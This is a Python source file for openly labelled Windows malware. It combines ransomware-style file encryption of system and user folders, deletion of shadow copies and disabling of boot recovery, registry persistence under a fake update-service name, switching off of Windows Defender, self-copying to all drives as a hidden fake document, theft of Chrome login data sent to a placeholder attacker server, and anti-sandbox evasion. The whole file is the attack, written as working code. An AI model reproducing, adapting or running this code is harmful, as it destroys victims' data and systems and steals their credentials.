import os
import shutil
import sys
import ctypes
import winreg
import threading
import urllib.request
import smtplib
from email.mime.text import MIMEText
import zipfile
import base64
import subprocess
from cryptography.fernet import Fernet

# ======================
# VIRUS CORE COMPONENTS 
# ======================

class AutoDestruct:
    def __init__(self):
        self.admin = self.check_admin()
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        
    def check_admin(self):
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
            
    def encrypt_drive(self, path):
        for root, _, files in os.walk(path):
            for file in files:
                try:
                    filepath = os.path.join(root, file)
                    with open(filepath, 'rb') as f:
                        data = f.read()
                    encrypted = self.cipher.encrypt(data)
                    with open(filepath, 'wb') as f:
                        f.write(encrypted)
                    os.rename(filepath, filepath + ".LOCKED")
                except:
                    pass
                    
    def corrupt_system(self):
        critical_paths = [
            os.environ['WINDIR'] + "\\System32",
            os.environ['APPDATA'],
            os.environ['USERPROFILE'] + "\\Documents"
        ]
        for path in critical_paths:
            threading.Thread(target=self.encrypt_drive, args=(path,)).start()
            
    def kill_windows(self):
        os.system("taskkill /f /im svchost.exe")
        os.system("vssadmin delete shadows /all /quiet")
        os.system("bcdedit /set {default} recoveryenabled no")
        os.system("bcdedit /set {default} bootstatuspolicy ignoreallfailures")
        
    def execute(self):
        if self.admin:
            self.corrupt_system()
            self.kill_windows()
        else:
            # Trigger UAC bypass for admin escalation
            try:
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
            except:
                pass

# ======================
# STEALTH & PERSISTENCE
# ======================

class Persistence:
    def __init__(self):
        self.install_path = os.path.join(os.environ['APPDATA'], "WindowsUpdateService")
        
    def install(self):
        if not os.path.exists(self.install_path):
            os.makedirs(self.install_path)
            shutil.copyfile(sys.argv[0], os.path.join(self.install_path, "svchost.exe"))
            
        # Registry persistence
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE) as key:
                winreg.SetValueEx(key, "WindowsUpdateService", 0, winreg.REG_SZ, f'"{os.path.join(self.install_path, "svchost.exe")}"')
        except:
            pass
        
        # Disable protections
        os.system("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f")
        os.system("powershell Set-MpPreference -DisableRealtimeMonitoring $true")
        
    def self_replicate(self):
        for drive in [chr(x) + ":" for x in range(65,91) if os.path.exists(chr(x) + ":")]:
            dest = os.path.join(drive, "Important_Document.exe")
            try:
                shutil.copyfile(sys.argv[0], dest)
                # Hide file
                os.system(f"attrib +h +s +r \"{dest}\"")
            except:
                pass

# ======================
# DATA EXFILTRATION
# ======================

class SpyModule:
    def __init__(self):
        self.webhook = "https://malicious-server.com/collect"
        
    def harvest_creds(self):
        try:
            # Chrome password extraction stub
            data = subprocess.check_output(
                "powershell Get-ChildItem -Path $env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login* | Select-Object -Last 1 | Get-Content", 
                shell=True
            )
            self.exfiltrate(data)
        except:
            pass
            
    def keylogger(self):
        # Keylogger implementation would go here
        pass
        
    def exfiltrate(self, data):
        try:
            encoded = base64.b64encode(data).decode()
            urllib.request.urlopen(self.webhook + "?data=" + encoded, timeout=5)
        except:
            pass

# ======================
# MAIN EXECUTION FLOW  
# ======================

if __name__ == "__main__":
    # Anti-sandbox checks
    if os.path.exists("C:\\analysis\\sandbox.exe") or "vmware" in os.environ.get('PROCESSOR_IDENTIFIER', '').lower():
        sys.exit(0)
    
    # Deployment phase
    persistence = Persistence()
    persistence.install()
    persistence.self_replicate()
    
    # Spy module
    spy = SpyModule()
    threading.Thread(target=spy.harvest_creds).start()
    
    # Destruct sequence
    if "--no-destruct" not in sys.argv:  # Secret backdoor
        AutoDestruct().execute()
    
    # Overwrite own file after execution
    try:
        with open(sys.argv[0], 'wb') as f:
            f.write(os.urandom(2048))
        os.remove(sys.argv[0])
    except:
        pass